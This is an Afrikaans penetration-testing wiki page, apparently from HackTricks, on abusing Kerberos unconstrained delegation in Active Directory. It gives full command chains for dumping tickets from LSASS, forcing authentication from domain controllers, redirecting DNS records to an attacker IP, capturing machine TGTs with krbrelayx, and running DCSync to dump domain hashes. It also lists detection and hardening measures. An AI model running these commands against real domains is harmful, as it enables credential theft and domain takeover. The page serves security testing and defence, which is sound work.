# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Dit is 'n funksie wat 'n Domain Administrator aan enige **Computer** binne die domain kan toeken. Daarna, wanneer 'n **user aanmeld** by die Computer, gaan 'n **kopie van die TGT** van daardie user **binne die TGS** wat deur die DC verskaf word, **gestuur en in die geheue in LSASS gestoor** word. As jy dus Administrator-voorregte op die masjien het, sal jy die **tickets kan dump en die users kan impersonate** op enige masjien.

As 'n domain admin dus by 'n Computer aanmeld waarop die "Unconstrained Delegation"-funksie geaktiveer is, en jy plaaslike admin-voorregte op daardie masjien het, sal jy die ticket kan dump en die Domain Admin enige plek kan impersonate (domain privesc).

Jy kan **Computer-objekte met hierdie attribuut vind** deur te kontroleer of die [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>)-attribuut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) bevat. Jy kan dit doen met 'n LDAP-filter van ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, wat is wat powerview doen:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Laai die ticket van Administrator (of die victim user) in die geheue met **Mimikatz** of **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Meer info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Meer inligting oor Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

As ’n attacker in staat is om ’n **computer allowed for "Unconstrained Delegation"** te **compromise**, kan hy ’n **Print server** **trick** om **automatically login** daarteen, wat ’n **TGT** in die geheue van die server stoor.\
Daarna kan die attacker ’n **Pass the Ticket attack** uitvoer om die user se Print server computer account te **impersonate**.

Om ’n print server teen enige masjien te laat login, kan jy [**SpoolSample**](https://github.com/leechristensen/SpoolSample) gebruik:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
As die TGT van ’n domeinbeheerder afkomstig is, kan jy ’n [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) uitvoer en al die hashes van die DC bekom.\
[**Meer inligting oor hierdie attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Vind hier ander maniere om **force an authentication:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Enige ander coercion primitive wat veroorsaak dat die slagoffer met **Kerberos** by jou unconstrained-delegation-host authenticate, werk ook. In moderne omgewings beteken dit dikwels dat die klassieke PrinterBug-vloei vir **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, of **WebClient/WebDAV**-gebaseerde coercion verruil word, afhangend van watter RPC-surface bereikbaar is.

### Misbruik van ’n user/service account met unconstrained delegation

Unconstrained delegation is **nie beperk tot computer objects nie**. ’n **User/service account** kan ook as `TRUSTED_FOR_DELEGATION` gekonfigureer word. In daardie scenario is die praktiese vereiste dat die account Kerberos-service tickets moet ontvang vir ’n **SPN wat dit besit**.

Dit lei tot 2 baie algemene offensive paths:

1. Jy kompromitteer die password/hash van die unconstrained-delegation **user account**, en **add dan ’n SPN** by daardie selfde account.
2. Die account het reeds een of meer SPNs, maar een daarvan wys na ’n **stale/decommissioned hostname**; om die ontbrekende **DNS A record** te herskep, is genoeg om die authentication-flow te hijack sonder om die SPN-set te wysig.<sup>[[8]](#references)</sup>

Minimale Linux-flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notas:

- Dit is veral nuttig wanneer die unconstrained principal ’n **service account** is en jy slegs sy credentials het, nie code execution op ’n joined host nie.
- As die teikengebruiker reeds ’n **stale SPN** het, kan die herskepping van die ooreenstemmende **DNS record** minder opvallend wees as om ’n nuwe SPN in AD te skryf.
- Onlangse Linux-gesentreerde tradecraft gebruik `addspn.py`, `dnstool.py`, `krbrelayx.py` en een coercion primitive; jy hoef nie aan ’n Windows-host te raak om die ketting te voltooi nie.

### Misbruik van Unconstrained Delegation met ’n attacker-created computer

Moderne domains het dikwels `MachineAccountQuota > 0` (verstekwaarde 10), wat enige authenticated principal toelaat om tot N computer objects te skep. As jy ook die `SeEnableDelegationPrivilege` token privilege (of ekwivalente regte) het, kan jy die nuutgeskepte computer instel om vir unconstrained delegation vertrou te word en inbound TGTs vanaf privileged systems te harvest.<sup>[[1]](#references)</sup>

Hoëvlakvloei:

1) Skep ’n computer wat jy beheer
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Maak die vals gasheernaam binne die domein oplosbaar
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Aktiveer Unconstrained Delegation op die aanvaller-beheerde rekenaar
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Waarom dit werk: met unconstrained delegation cache die LSA op ’n rekenaar met delegation geaktiveer inkomende TGT’s. As jy ’n DC of bevoorregte server mislei om by jou vals host te authenticate, sal sy machine-TGT gestoor word en kan dit uitgevoer word.

4) Begin krbrelayx in export mode en berei die Kerberos-materiaal voor
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Dwing authentication vanaf die DC/servers na jou fake host
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx sal ccache-lêers stoor wanneer ’n masjien autentiseer, byvoorbeeld:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Gebruik die vasgevangde DC machine TGT om DCSync uit te voer
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notas en vereistes:

- `MachineAccountQuota > 0` maak die skepping van rekenaars deur ongeprivilegieerde gebruikers moontlik; andersins benodig jy eksplisiete regte.
- Om `TRUSTED_FOR_DELEGATION` op ’n rekenaar te stel, vereis `SeEnableDelegationPrivilege` (of domain admin).
- Verseker naamresolusie na jou vals host (DNS A-record) sodat die DC dit deur sy FQDN kan bereik.
- Coercion vereis ’n werkbare vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, ens.). Deaktiveer dit indien moontlik op DCs.
- As die slagofferrekening gemerk is as **"Account is sensitive and cannot be delegated"** of ’n lid van **Protected Users** is, sal die forwarded TGT nie by die service ticket ingesluit word nie; dus sal hierdie ketting nie ’n herbruikbare TGT oplewer nie.<sup>[[9]](#references)</sup>
- As **Credential Guard** op die authenticating client/server geaktiveer is, blokkeer Windows **Kerberos unconstrained delegation**, wat kan veroorsaak dat andersins geldige coercion-paaie vanuit ’n operator-perspektief misluk.

Idees vir opsporing en hardening:

- Genereer ’n alert vir Event ID 4741 (computer account created) en 4742/4738 (computer/user account changed) wanneer UAC `TRUSTED_FOR_DELEGATION` gestel word.
- Monitor vir ongewone DNS A-record-byvoegings in die domain zone.
- Let op vir skielike toenames in 4768/4769 vanaf onverwagte hosts en DC-authentications na nie-DC-hosts.
- Beperk `SeEnableDelegationPrivilege` tot ’n minimale stel, stel `MachineAccountQuota=0` waar uitvoerbaar, en deaktiveer Print Spooler op DCs. Dwing LDAP signing en channel binding af.

### Mitigation

- Beperk DA/Admin-logins tot spesifieke dienste
- Stel "Account is sensitive and cannot be delegated" vir privileged accounts.

## Verwysings

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
